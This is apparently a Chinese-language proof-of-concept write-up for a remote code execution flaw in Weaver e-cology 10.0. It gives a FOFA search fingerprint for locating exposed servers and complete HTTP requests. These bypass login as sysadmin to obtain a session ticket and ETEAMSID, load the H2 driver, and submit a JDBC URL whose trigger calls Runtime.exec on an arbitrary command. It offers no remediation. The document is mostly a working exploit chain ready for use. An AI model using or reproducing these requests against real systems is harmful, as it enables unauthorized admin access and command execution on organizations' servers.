# 泛微e-cology-v10远程代码执行漏洞

通过e-cology-10.0的/papi/passport/rest/appThirdLogin接口传入管理员账号信息获取票据，系统依赖 H2 数据库且有 JDBC 反序列化漏洞。

## fofa

```yaml
icon_hash="-1619753057"
```

## poc

### 获取serviceTicketId

```yaml
POST /papi/passport/rest/appThirdLogin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

username=sysadmin&service=1&ip=1&loginType=third


----
HTTP/1.1 200 OK
Server: ******
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
Date: Tue, 20 Aug 2024 08:39:09 GMT
traceId: f377fe57-0a32-42e8-80f8-91178393ca96
Set-Cookie: ETEAMS_TGC=TGT521-0L9GdBeMWxijLGMwbnRPEATrA9cHd9pvbaQ4sjcKA9EIgY5cBx; Path=/
Access-Control-Allow-Headers: X-CSRFToken,Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,X-File-Name,i18n,token,appkey,userName,password,sw8,eteamsid,traceid,langType,timezoneoffset,authtoken,signature,enableTrans,routePath,tranceid,currentUrl,ebbusinessid,ebBusinessId
Access-Control-Max-Age: 86400
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
Content-Length: 179

{"success":"true","serviceTicketId":"ST-591-hEd3zpL4xVLMTe9hJ0wR-http://10.0.0.1","message":"登录成功","tgtId":"TGT521-0L9GdBeMWxijLGMwbnRPEATrA9cHd9pvbaQ4sjcKA9EIgY5cBx"}
```

### 获取ETEAMSID

```java
POST /papi/passport/login/generateEteamsId HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

stTicket=ST-591-hEd3zpL4xVLMTe9hJ0wR-http://10.0.0.1


----
HTTP/1.1 200 OK
Server: ******
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
Date: Tue, 20 Aug 2024 08:41:51 GMT
traceId: d7c16568-6727-4dab-bb87-e8f77ac37703
Access-Control-Allow-Headers: X-CSRFToken,Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,X-File-Name,i18n,token,appkey,userName,password,sw8,eteamsid,traceid,langType,timezoneoffset,authtoken,signature,enableTrans,routePath,tranceid,currentUrl,ebbusinessid,ebBusinessId
Access-Control-Max-Age: 86400
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
Content-Length: 114

{"code":200,"msg":"接口返回成功","status":true,"data":"THIRD_def423a1574e66bbdb29bc647cd8ccf6","fail":false}
```

### 加载org.h2.Driver

```java
POST /api/bs/iaauthclient/base/save HTTP/1.1
Host: 
Content-Length: 86
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://ip
Referer: http://ip/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
ETEAMSID: THIRD_def423a1574e66bbdb29bc647cd8ccf6

{"isUse":1,"auth_type":"custom","iaAuthclientCustomDTO":{"ruleClass":"org.h2.Driver"}}
```

### 执行命令

```javascript
POST /api/dw/connSetting/testConnByBasePassword HTTP/1.1
Host: 
Content-Length: 199
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://ip
Referer: http://ip/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
ETEAMSID: THIRD_18cd45709040d63b6b684d94b5773deb

{"dbType":"mysql5","dbUrl":"jdbc:h2:mem:test;MODE=MSSQLServer;init = CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$ //javascript\njava.lang.Runtime.getRuntime().exec(\"{cmd}\")$$"}
```

也可以通过上面第一步、第二步获取ETEAMSID值直接进入后台管理页面。



## 漏洞来源

- https://mp.weixin.qq.com/s/ACe_UhWsdUV3YPhUERcxsg